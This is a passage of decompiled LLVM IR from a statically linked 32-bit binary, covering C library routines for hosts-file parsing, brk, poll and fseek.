  br i1 %v1_8053647, label %dec_label_pc_805362f, label %dec_label_pc_805364f.preheader

dec_label_pc_805364f.preheader:                   ; preds = %dec_label_pc_8053644, %dec_label_pc_8053636, %dec_label_pc_805362f, %dec_label_pc_8053622
  %v0_805362f.lcssa = phi i32 [ %v0_8053630.pre, %dec_label_pc_8053622 ], [ %v1_805362f, %dec_label_pc_805362f ], [ %v0_805362f67, %dec_label_pc_8053636 ], [ %v0_805362f67, %dec_label_pc_8053644 ]
  %v6_8053630.lcssa = phi i32 [ %v6_805363064, %dec_label_pc_8053622 ], [ %v6_8053630, %dec_label_pc_805362f ], [ %v6_805363069, %dec_label_pc_8053636 ], [ %v6_805363069, %dec_label_pc_8053644 ]
  %v1_805364f75 = inttoptr i32 %v0_805362f.lcssa to i8*
  %v2_805364f76 = load i8, i8* %v1_805364f75, align 1
  %v3_805364f77 = zext i8 %v2_805364f76 to i32
  %v5_805364f78 = and i32 %v6_8053630.lcssa, -256
  %v6_805364f79 = or i32 %v3_805364f77, %v5_805364f78
  store i32 %v6_805364f79, i32* @ecx, align 4
  %v4_805365180 = icmp eq i8 %v2_805364f76, 0
  br i1 %v4_805365180, label %dec_label_pc_8053668, label %dec_label_pc_8053655

dec_label_pc_805364b:                             ; preds = %dec_label_pc_8053663, %dec_label_pc_8053655
  store i8 0, i8* %v1_805364f83, align 1
  %v0_805364e = load i32, i32* @ebx, align 4
  %v1_805364e = add i32 %v0_805364e, 1
  store i32 %v1_805364e, i32* @ebx, align 4
  %v4_805364f.pre = load i32, i32* @ecx, align 4
  %v1_805364f = inttoptr i32 %v1_805364e to i8*
  %v2_805364f = load i8, i8* %v1_805364f, align 1
  %v3_805364f = zext i8 %v2_805364f to i32
  %v5_805364f = and i32 %v4_805364f.pre, -256
  %v6_805364f = or i32 %v3_805364f, %v5_805364f
  store i32 %v6_805364f, i32* @ecx, align 4
  %v4_8053651 = icmp eq i8 %v2_805364f, 0
  br i1 %v4_8053651, label %dec_label_pc_8053668, label %dec_label_pc_8053655

dec_label_pc_8053655:                             ; preds = %dec_label_pc_805364f.preheader, %dec_label_pc_805364b
  %v2_805364f84 = phi i8 [ %v2_805364f, %dec_label_pc_805364b ], [ %v2_805364f76, %dec_label_pc_805364f.preheader ]
  %v1_805364f83 = phi i8* [ %v1_805364f, %dec_label_pc_805364b ], [ %v1_805364f75, %dec_label_pc_805364f.preheader ]
  %v0_805366c82 = phi i32 [ %v1_805364e, %dec_label_pc_805364b ], [ %v0_805362f.lcssa, %dec_label_pc_805364f.preheader ]
  %v0_8053655 = load i32, i32* @global_var_805a438, align 8
  store i32 %v0_8053655, i32* @eax, align 4
  %v2_805365a = sext i8 %v2_805364f84 to i32
  store i32 %v2_805365a, i32* @edx, align 4
  %v2_805365d = mul nsw i32 %v2_805365a, 2
  %v3_805365d = add i32 %v0_8053655, %v2_805365d
  %v4_805365d = inttoptr i32 %v3_805365d to i8*
  %v5_805365d = load i8, i8* %v4_805365d, align 1
  %v6_805365d = and i8 %v5_805365d, 32
  %v7_805365d = icmp eq i8 %v6_805365d, 0
  %v1_8053661 = icmp eq i1 %v7_805365d, false
  br i1 %v1_8053661, label %dec_label_pc_805364b, label %dec_label_pc_8053663

dec_label_pc_8053663:                             ; preds = %dec_label_pc_8053655
  %v10_8053663 = icmp eq i8 %v2_805364f84, 10
  br i1 %v10_8053663, label %dec_label_pc_805364b, label %dec_label_pc_8053668

dec_label_pc_8053668:                             ; preds = %dec_label_pc_805364b, %dec_label_pc_8053663, %dec_label_pc_805364f.preheader
  %v0_805366c.lcssa = phi i32 [ %v0_805362f.lcssa, %dec_label_pc_805364f.preheader ], [ %v0_805366c82, %dec_label_pc_8053663 ], [ %v1_805364e, %dec_label_pc_805364b ]
  %v1_805364f.lcssa = phi i8* [ %v1_805364f75, %dec_label_pc_805364f.preheader ], [ %v1_805364f83, %dec_label_pc_8053663 ], [ %v1_805364f, %dec_label_pc_805364b ]
  %v4_8053668 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_805366c = load i8, i8* %v1_805364f.lcssa, align 1
  %v3_805366c = icmp eq i8 %v2_805366c, 0
  br i1 %v3_805366c, label %dec_label_pc_8053678, label %dec_label_pc_8053671

dec_label_pc_8053671:                             ; preds = %dec_label_pc_805366c.preheader, %dec_label_pc_8053668
  %v0_8053626 = phi i32 [ %v0_805366c.lcssa, %dec_label_pc_8053668 ], [ %v0_80535ee56, %dec_label_pc_805366c.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_8053668, %dec_label_pc_8053668 ], [ 0, %dec_label_pc_805366c.preheader ]
  %v7_8053676 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_8053676, label %dec_label_pc_8053678, label %dec_label_pc_8053622

dec_label_pc_8053678:                             ; preds = %dec_label_pc_8053668, %dec_label_pc_8053671, %dec_label_pc_805366c.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_805366c.preheader ], [ %v4_8053668, %dec_label_pc_8053668 ], [ %stack_var_-196.013, %dec_label_pc_8053671 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_805367f = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8058607.249 to i32), i32* %stack_var_-216, align 4
  %v5_805368c = call i32 @__GI_strcoll(i8* %v4_805368c, i32 ptrtoint ([11 x i8]* @global_var_8058607.249 to i32), i32 %v0_805367f, i32 %v0_805367f)
  store i32 %v5_805368c, i32* @eax, align 4
  %v1_8053694 = icmp eq i32 %v5_805368c, 0
  br i1 %v1_8053694, label %dec_label_pc_80536bc.preheader, label %dec_label_pc_80536cd

dec_label_pc_80536bc.preheader:                   ; preds = %dec_label_pc_8053678
  %v0_80536bc89 = load i32, i32* @esi, align 4
  %v5_80536c098 = icmp slt i32 %v0_80536bc89, %stack_var_-196.0.lcssa
  br i1 %v5_80536c098, label %dec_label_pc_80536c2.lr.ph, label %dec_label_pc_80536cd

dec_label_pc_80536c2.lr.ph:                       ; preds = %dec_label_pc_80536bc.preheader
  %v0_80536c2.pre = load i32, i32* @global_var_8060d94.184, align 4
  br label %dec_label_pc_80536c2

dec_label_pc_805369a:                             ; preds = %dec_label_pc_80536c2
  %v2_805369d = mul i32 %v0_80536bc99, 4
  %v4_805369d = add i32 %v2_805369d, %v3_805369d
  %v5_805369d = inttoptr i32 %v4_805369d to i32*
  %v6_805369d = load i32, i32* %v5_805369d, align 4
  %v1_80536a4 = add i32 %v0_80536bc99, 1
  store i32 %v1_80536a4, i32* @esi, align 4
  %v1_80536a5 = inttoptr i32 %v6_805369d to i8*
  %v2_80536a5 = call i32 @__GI_strdup(i8* %v1_80536a5)
  %v1_80536ad = load i32, i32* @ebx, align 4
  %v2_80536ad = mul i32 %v1_80536ad, 4
  %v3_80536ad = add i32 %v2_80536ad, 134614408
  %v4_80536ad = inttoptr i32 %v3_80536ad to i32*
  store i32 %v2_80536a5, i32* %v4_80536ad, align 4
  %v0_80536b4 = load i32, i32* @ebx, align 4
  %v1_80536b4 = add i32 %v0_80536b4, 1
  store i32 %v1_80536b4, i32* @eax, align 4
  store i32 %v1_80536b4, i32* @global_var_8060d94.184, align 4
  %v0_80536bc = load i32, i32* @esi, align 4
  %v5_80536c0 = icmp slt i32 %v0_80536bc, %stack_var_-196.0.lcssa
  br i1 %v5_80536c0, label %dec_label_pc_80536c2, label %dec_label_pc_80536cd

dec_label_pc_80536c2:                             ; preds = %dec_label_pc_80536c2.lr.ph, %dec_label_pc_805369a
  %v0_80536c2 = phi i32 [ %v0_80536c2.pre, %dec_label_pc_80536c2.lr.ph ], [ %v1_80536b4, %dec_label_pc_805369a ]
  %v0_80536bc99 = phi i32 [ %v0_80536bc89, %dec_label_pc_80536c2.lr.ph ], [ %v0_80536bc, %dec_label_pc_805369a ]
  store i32 %v0_80536c2, i32* @ebx, align 4
  %v7_80536cb = icmp sgt i32 %v0_80536c2, 2
  br i1 %v7_80536cb, label %dec_label_pc_80536cd, label %dec_label_pc_805369a

dec_label_pc_80536cd:                             ; preds = %dec_label_pc_80536bc.preheader, %dec_label_pc_805369a, %dec_label_pc_80536c2, %dec_label_pc_8053678
  %v0_80536cd = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8058612.250 to i32), i32* %stack_var_-216, align 4
  %v0_80536d4 = load i32, i32* @edi, align 4
  %v4_80536d5 = inttoptr i32 %v0_80536d4 to i8*
  %v5_80536d5 = call i32 @__GI_strcoll(i8* %v4_80536d5, i32 ptrtoint ([7 x i8]* @global_var_8058612.250 to i32), i32 %v0_80536cd, i32 %v0_80536cd)
  store i32 %v5_80536d5, i32* @eax, align 4
  %v1_80536dd = icmp eq i32 %v5_80536d5, 0
  br i1 %v1_80536dd, label %dec_label_pc_805371f.preheader, label %dec_label_pc_80536e1

dec_label_pc_80536e1:                             ; preds = %dec_label_pc_80536cd
  %v0_80536e1 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8058619.251 to i32), i32* %stack_var_-216, align 4
  %v0_80536e8 = load i32, i32* @edi, align 4
  %v4_80536e9 = inttoptr i32 %v0_80536e8 to i8*
  %v5_80536e9 = call i32 @__GI_strcoll(i8* %v4_80536e9, i32 ptrtoint ([7 x i8]* @global_var_8058619.251 to i32), i32 %v0_80536e1, i32 %v0_80536e1)
  %v1_80536f1 = icmp eq i32 %v5_80536e9, 0
  br i1 %v1_80536f1, label %dec_label_pc_805371f.preheader, label %dec_label_pc_8053762

dec_label_pc_805371f.preheader:                   ; preds = %dec_label_pc_80536cd, %dec_label_pc_80536e1
  %v0_805371f100 = load i32, i32* @global_var_8060d98.244, align 8
  %tmp43103 = icmp slt i32 %v0_805371f100, 1
  %tmp44104 = icmp eq i1 %tmp43103, false
  br i1 %tmp44104, label %dec_label_pc_80536f7, label %dec_label_pc_8053728

dec_label_pc_80536f7:                             ; preds = %dec_label_pc_805371f.preheader, %dec_label_pc_80536f7.dec_label_pc_80536f7_crit_edge
  %v0_805371f105 = phi i32 [ %v0_805371f, %dec_label_pc_80536f7.dec_label_pc_80536f7_crit_edge ], [ %v0_805371f100, %dec_label_pc_805371f.preheader ]
  %v1_80536f7 = add i32 %v0_805371f105, -1
  %v1_80536fb = mul i32 %v1_80536f7, 4
  %v2_80536fb = add i32 %v1_80536fb, 134614392
  %v3_80536fb = inttoptr i32 %v2_80536fb to i32*
  %v4_80536fb = load i32, i32* %v3_80536fb, align 4
  store i32 %v1_80536f7, i32* @global_var_8060d98.244, align 8
  %v1_8053707 = call i32 @free(i32 %v4_80536fb)
  %v0_805370c = load i32, i32* @global_var_8060d98.244, align 8
  %v1_8053714 = mul i32 %v0_805370c, 4
  %v2_8053714 = add i32 %v1_8053714, ptrtoint (i32* @global_var_8060d78.252 to i32)
  %v3_8053714 = inttoptr i32 %v2_8053714 to i32*
  store i32 0, i32* %v3_8053714, align 4
  %v0_805371f = load i32, i32* @global_var_8060d98.244, align 8
  %tmp43 = icmp slt i32 %v0_805371f, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_80536f7.dec_label_pc_80536f7_crit_edge, label %dec_label_pc_8053728

dec_label_pc_80536f7.dec_label_pc_80536f7_crit_edge: ; preds = %dec_label_pc_80536f7
  br label %dec_label_pc_80536f7

dec_label_pc_8053728:                             ; preds = %dec_label_pc_80536f7, %dec_label_pc_805371f.preheader
  %v0_805371f.lcssa = phi i32 [ %v0_805371f100, %dec_label_pc_805371f.preheader ], [ %v0_805371f, %dec_label_pc_80536f7 ]
  store i32 1, i32* @esi, align 4
  %v5_8053755115 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8053755115, label %dec_label_pc_8053757, label %dec_label_pc_8053762

dec_label_pc_805372f:                             ; preds = %dec_label_pc_8053757
  %v2_8053732 = mul i32 %v0_8053739117, 4
  %v4_8053732 = add i32 %v2_8053732, %v3_805369d
  %v5_8053732 = inttoptr i32 %v4_8053732 to i32*
  %v6_8053732 = load i32, i32* %v5_8053732, align 4
  %v1_8053739 = add i32 %v0_8053739117, 1
  store i32 %v1_8053739, i32* @esi, align 4
  %v1_805373a = inttoptr i32 %v6_8053732 to i8*
  %v2_805373a = call i32 @__GI_strdup(i8* %v1_805373a)
  %v1_8053742 = load i32, i32* @ebx, align 4
  %v2_8053742 = mul i32 %v1_8053742, 4
  %v3_8053742 = add i32 %v2_8053742, 134614392
  %v4_8053742 = inttoptr i32 %v3_8053742 to i32*
  store i32 %v2_805373a, i32* %v4_8053742, align 4
  %v0_8053749 = load i32, i32* @ebx, align 4
  %v1_8053749 = add i32 %v0_8053749, 1
  store i32 %v1_8053749, i32* @global_var_8060d98.244, align 8
  %v0_8053751.pre = load i32, i32* @esi, align 4
  %v5_8053755 = icmp slt i32 %v0_8053751.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8053755, label %dec_label_pc_8053757, label %dec_label_pc_8053762

dec_label_pc_8053757:                             ; preds = %dec_label_pc_8053728, %dec_label_pc_805372f
  %v0_8053739117 = phi i32 [ %v0_8053751.pre, %dec_label_pc_805372f ], [ 1, %dec_label_pc_8053728 ]
  %v0_8053757116 = phi i32 [ %v1_8053749, %dec_label_pc_805372f ], [ %v0_805371f.lcssa, %dec_label_pc_8053728 ]
  store i32 %v0_8053757116, i32* @ebx, align 4
  %v7_8053760 = icmp sgt i32 %v0_8053757116, 3
  br i1 %v7_8053760, label %dec_label_pc_8053762, label %dec_label_pc_805372f

dec_label_pc_8053762:                             ; preds = %dec_label_pc_80535ef.preheader, %dec_label_pc_80535ee, %dec_label_pc_8053728, %dec_label_pc_8053757, %dec_label_pc_805372f, %dec_label_pc_80536e1, %dec_label_pc_8053610, %dec_label_pc_8053607, %dec_label_pc_8053762.preheader
  %v0_8053762 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8053769, i32* @ebx, align 4
  %v3_805376e = call i32 @fgets(i32 %v2_8053769, i32 128, i32 %v0_8053762)
  store i32 %v3_805376e, i32* @eax, align 4
  %v1_8053776 = icmp eq i32 %v3_805376e, 0
  %v1_8053778 = icmp eq i1 %v1_8053776, false
  br i1 %v1_8053778, label %dec_label_pc_80535ef.preheader, label %dec_label_pc_805377e

dec_label_pc_80535ef.preheader:                   ; preds = %dec_label_pc_8053762
  %v0_80535ef.pre = load i32, i32* @ebx, align 4
  %v4_80535ef.pre = load i32, i32* @ecx, align 4
  %v1_80535ef49 = inttoptr i32 %v0_80535ef.pre to i8*
  %v2_80535ef50 = load i8, i8* %v1_80535ef49, align 1
  %v3_80535ef51 = zext i8 %v2_80535ef50 to i32
  %v5_80535ef52 = and i32 %v4_80535ef.pre, -256
  %v6_80535ef53 = or i32 %v3_80535ef51, %v5_80535ef52
  store i32 %v6_80535ef53, i32* @ecx, align 4
  %v4_80535f154 = icmp eq i8 %v2_80535ef50, 0
  br i1 %v4_80535f154, label %dec_label_pc_8053762, label %dec_label_pc_80535f9.lr.ph

dec_label_pc_80535f9.lr.ph:                       ; preds = %dec_label_pc_80535ef.preheader
  %v0_80535f9.pre = load i32, i32* @global_var_805a438, align 8
  br label %dec_label_pc_80535f9

dec_label_pc_805377e:                             ; preds = %dec_label_pc_8053762
  %v0_8053781 = load i32, i32* @ebp, align 4
  %v1_8053782 = inttoptr i32 %v0_8053781 to i16*
  %v2_8053782 = call i32 @__GI_fclose(i16* %v1_8053782)
  br label %dec_label_pc_8053797

dec_label_pc_805378c:                             ; preds = %dec_label_pc_80535cb
  %v0_805378c = call i32 @__GI___h_errno_location()
  %v1_8053791 = inttoptr i32 %v0_805378c to i32*
  store i32 3, i32* %v1_8053791, align 4
  br label %dec_label_pc_8053797

dec_label_pc_8053797:                             ; preds = %entry, %dec_label_pc_805377e, %dec_label_pc_805378c
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8053584, i32* @eax, align 4
  %v2_80537a3 = call i32 @__pthread_return_void(i32 %v2_8053584, i32 1)
  store i32 %v0_8053570, i32* @ebp, align 4
  ret i32 %v2_80537a3

; uselistorder directives
  uselistorder i32 %v0_80535f9.pre, { 1, 0 }
  uselistorder i32 %v6_80535ef53, { 1, 0 }
  uselistorder i8 %v2_80535ef50, { 1, 2, 0 }
  uselistorder i8* %v1_80535ef49, { 1, 0 }
  uselistorder i32 %v0_80535ef.pre, { 1, 0 }
  uselistorder i32 %v0_805371f, { 0, 2, 1 }
  uselistorder i32 %v0_80536c2, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_805365a, { 1, 0 }
  uselistorder i32 %v2_805363b, { 1, 0 }
  uselistorder i32 %v1_805362f, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80535fe, { 1, 0 }
  uselistorder i32 %v1_80535ee, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 0, 4, 3, 1, 2 }
  uselistorder i32 (i32)* @free, { 18, 1, 0, 16, 15, 14, 13, 12, 26, 25, 24, 23, 4, 11, 10, 9, 8, 7, 17, 2, 19, 22, 21, 20, 6, 5, 3 }
  uselistorder i32* @global_var_8060d98.244, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 14, 3, 4, 5, 6, 15, 13, 7, 16, 8, 17, 9, 10, 11, 12, 18 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_8060d94.184, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805a6a8.183 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_8053797, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053762, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_8053757, { 1, 0 }
  uselistorder label %dec_label_pc_80536f7, { 1, 0 }
  uselistorder label %dec_label_pc_805371f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80536cd, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80536c2, { 1, 0 }
  uselistorder label %dec_label_pc_8053678, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053671, { 1, 0 }
  uselistorder label %dec_label_pc_8053668, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053655, { 1, 0 }
  uselistorder label %dec_label_pc_8053636, { 1, 0 }
  uselistorder label %dec_label_pc_8053762.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_80537d7 = inttoptr i32 %arg3 to i32*
  %v10_80537d7 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_80537d7, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_80537d7
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80537e3 = call i32 @__libc_getpid()
  %v2_80537ef = call i32 @kill(i32 %v0_80537e3, i32 %arg1)
  ret i32 %v2_80537ef

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 1, 3, 0, 2 }
  uselistorder i32 ()* @__libc_getpid, { 1, 3, 2, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_80537f8 = load i32, i32* @eax, align 4
  %v1_80537f8 = add i32 %v0_80537f8, 28
  %v2_80537f8 = inttoptr i32 %v1_80537f8 to i32*
  %v3_80537f8 = load i32, i32* %v2_80537f8, align 4
  store i32 %v3_80537f8, i32* @global_var_8060d9c.253, align 4
  %v1_8053801 = add i32 %v0_80537f8, 44
  %v2_8053801 = inttoptr i32 %v1_8053801 to i32*
  %v3_8053801 = load i32, i32* %v2_8053801, align 4
  store i32 %v3_8053801, i32* @global_var_8060da0.254, align 32
  ret i32 %v3_8053801
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805380c = load i32, i32* @ebx, align 4
  store i32 %v0_805380c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805381f = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805381f, i32* @global_var_8060964.231, align 4
  %v7_805382a = icmp ult i32 %v1_805381f, %arg1
  %v1_805382c = icmp eq i1 %v7_805382a, false
  br i1 %v1_805382c, label %dec_label_pc_805383c, label %dec_label_pc_805382e

dec_label_pc_805382e:                             ; preds = %entry
  %v0_805382e = load i32, i32* %stack_var_-4, align 4
  %v1_805382e = call i32 @__errno_location(i32 %v0_805382e)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8053836 = inttoptr i32 %v1_805382e to i32*
  store i32 12, i32* %v1_8053836, align 4
  %v0_805383d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805383c

dec_label_pc_805383c:                             ; preds = %entry, %dec_label_pc_805382e
  %v0_805383d = phi i32 [ 0, %entry ], [ %v0_805383d.pre, %dec_label_pc_805382e ]
  %v2_8053840 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053840, i32* @ebx, align 4
  ret i32 %v0_805383d

; uselistorder directives
  uselistorder i32 %v1_805381f, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8060964.231, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805383c, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8053844 = load i32, i32* @edi, align 4
  store i32 %v0_8053844, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_8053854 = load i32, i32* @ebx, align 4
  %v1_8053855 = inttoptr i32 %tmp4 to %pollfd*
  %v5_805385c = call i32 @poll(%pollfd* %v1_8053855, i32 %tmp3, i32 %tmp)
  store i32 %v0_8053854, i32* @ebx, align 4
  store i32 %v5_805385c, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_805385c, -4095
  br i1 %tmp10, label %dec_label_pc_8053874, label %dec_label_pc_8053868

dec_label_pc_8053868:                             ; preds = %entry
  %v1_8053868 = call i32 @__errno_location(i32 %v0_8053854)
  %v0_805386d = load i32, i32* %edi.global-to-local, align 4
  %v1_805386d = sub i32 0, %v0_805386d
  %v2_805386f = inttoptr i32 %v1_8053868 to i32*
  store i32 %v1_805386d, i32* %v2_805386f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8053874

dec_label_pc_8053874:                             ; preds = %entry, %dec_label_pc_8053868
  %v0_8053875 = phi i32 [ %v5_805385c, %entry ], [ -1, %dec_label_pc_8053868 ]
  %v2_8053878 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053878, i32* @edi, align 4
  ret i32 %v0_8053875

; uselistorder directives
  uselistorder i32 %v5_805385c, { 1, 0, 2 }
  uselistorder i32 %v0_8053854, { 1, 0 }
  uselistorder label %dec_label_pc_8053874, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8053887 = ashr i32 %arg2, 31
  %v4_805388e = inttoptr i32 %arg1 to i16*
  %v5_805388e = call i32 @__GI_fseeko64(i16* %v4_805388e, i32 %arg2, i32 %v1_8053887, i32 %arg3)
  ret i32 %v5_805388e
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8053898 = load i32, i32* @ebp, align 4
  %v0_8053899 = load i32, i32* @edi, align 4
  %v0_805389a = load i32, i32* @esi, align 4
  %v0_805389b = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_80538ab = ptrtoint i16* %arg1 to i32
  store i32 %v4_80538ab, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_80538cf, label %dec_label_pc_80538bc

dec_label_pc_80538bc:                             ; preds = %entry
  %v1_80538bc = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_80538bc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_80538c4 = inttoptr i32 %v1_80538bc to i32*
  store i32 22, i32* %v1_80538c4, align 4
  br label %dec_label_pc_8053975

dec_label_pc_80538cf:                             ; preds = %entry
  %v1_80538cf = add i32 %v4_80538ab, 52
  %v2_80538cf = inttoptr i32 %v1_80538cf to i32*
  %v3_80538cf = load i32, i32* %v2_80538cf, align 4
  %v1_80538d2 = icmp eq i32 %v3_80538cf, 0
  %v1_80538d4 = icmp eq i1 %v1_80538d2, false
  br i1 %v1_80538d4, label %dec_label_pc_80538f5, label %dec_label_pc_80538d6

dec_label_pc_80538d6:                             ; preds = %dec_label_pc_80538cf
  %v1_80538d6 = add i32 %v4_80538ab, 56
  store i32 %v1_80538d6, i32* @ebx, align 4
  %v2_80538e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80538e0, i32* @eax, align 4
  %v3_80538e5 = call i32 @__pthread_return_void(i32 %v2_80538e0, i32 134552291)
  store i32 %v3_80538e5, i32* %eax.global-to-local, align 4
  %v0_80538ea = load i32, i32* @ebx, align 4
  %v2_80538ed = call i32 @__pthread_return_0(i32 %v0_80538ea)
  store i32 %v2_80538ed, i32* %eax.global-to-local, align 4
  %v0_80538f5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80538f5

dec_label_pc_80538f5:                             ; preds = %dec_label_pc_80538cf, %dec_label_pc_80538d6
  %v0_80538fd = phi i32 [ %v4_80538ab, %dec_label_pc_80538cf ], [ %v0_80538f5.pre, %dec_label_pc_80538d6 ]
  %v1_80538f5 = inttoptr i32 %v0_80538fd to i8*
  %v2_80538f5 = load i8, i8* %v1_80538f5, align 1
  %v3_80538f5 = and i8 %v2_80538f5, 64
  %v4_80538f5 = icmp eq i8 %v3_80538f5, 0
  br i1 %v4_80538f5, label %dec_label_pc_805390a, label %dec_label_pc_80538fa

dec_label_pc_80538fa:                             ; preds = %dec_label_pc_80538f5
  %v2_80538fe = call i32 @__stdio_wcommit(i32 %v0_80538fd)
  store i32 %v2_80538fe, i32* %eax.global-to-local, align 4
  %v1_8053906 = icmp eq i32 %v2_80538fe, 0
  %v1_8053908 = icmp eq i1 %v1_8053906, false
  br i1 %v1_8053908, label %dec_label_pc_805395d, label %dec_label_pc_805390a

dec_label_pc_805390a:                             ; preds = %dec_label_pc_80538fa, %dec_label_pc_80538f5
  %v0_805390a = load i32, i32* @edi, align 4
  %v9_805390a = icmp eq i32 %v0_805390a, 1
  %v1_805390d = icmp eq i1 %v9_805390a, false
  br i1 %v1_805390d, label %dec_label_pc_805390a.dec_label_pc_8053923_crit_edge, label %dec_label_pc_805390f

dec_label_pc_805390a.dec_label_pc_8053923_crit_edge: ; preds = %dec_label_pc_805390a
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8053923

dec_label_pc_805390f:                             ; preds = %dec_label_pc_805390a
  %v0_805390f = load i32, i32* @ecx, align 4
  %v2_8053911 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8053911, i32* %eax.global-to-local, align 4
  %v0_8053916 = load i32, i32* @esi, align 4
  %v5_8053916 = inttoptr i32 %v0_8053916 to i16*
  %v6_8053917 = call i32 @__stdio_adjust_position(i16* %v5_8053916, i32 %v2_8053911, i32 %v0_805390f, i32 %v0_805390f)
  store i32 %v6_8053917, i32* %eax.global-to-local, align 4
  %v2_805391f = icmp slt i32 %v6_8053917, 0
  br i1 %v2_805391f, label %dec_label_pc_805395d, label %dec_label_pc_805390f.dec_label_pc_8053923_crit_edge

dec_label_pc_805390f.dec_label_pc_8053923_crit_edge: ; preds = %dec_label_pc_805390f
  %v0_8053924.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053923

dec_label_pc_8053923:                             ; preds = %dec_label_pc_805390a.dec_label_pc_8053923_crit_edge, %dec_label_pc_805390f.dec_label_pc_8053923_crit_edge
  %v2_8053925.pre-phi = phi i32 [ %.pre6, %dec_label_pc_805390a.dec_label_pc_8053923_crit_edge ], [ %v2_8053911, %dec_label_pc_805390f.dec_label_pc_8053923_crit_edge ]
  %v0_8053924 = phi i32 [ %v0_805390a, %dec_label_pc_805390a.dec_label_pc_8053923_crit_edge ], [ %v0_8053924.pre, %dec_label_pc_805390f.dec_label_pc_8053923_crit_edge ]
  %v0_8053923 = load i32, i32* @edx, align 4
  store i32 %v2_8053925.pre-phi, i32* %eax.global-to-local, align 4
  %v0_805392a = load i32, i32* @esi, align 4
